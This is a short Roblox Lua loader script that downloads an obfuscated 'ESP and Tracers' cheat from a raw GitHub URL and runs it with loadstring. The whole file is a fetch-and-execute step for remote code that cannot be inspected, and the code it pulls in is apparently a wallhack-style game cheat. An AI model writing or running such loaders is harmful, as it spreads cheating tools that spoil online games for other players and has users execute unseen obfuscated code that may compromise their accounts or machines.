function loadAndRunScript(url)
    local HttpService = game:GetService("HttpService")
    local scriptContent = HttpService:HttpGet(url)
    local func = loadstring(scriptContent)
    func()
end

loadAndRunScript("https://raw.githubusercontent.com/User319183/Roblox-ESP-and-Tracers/main/obfuscated.lua")
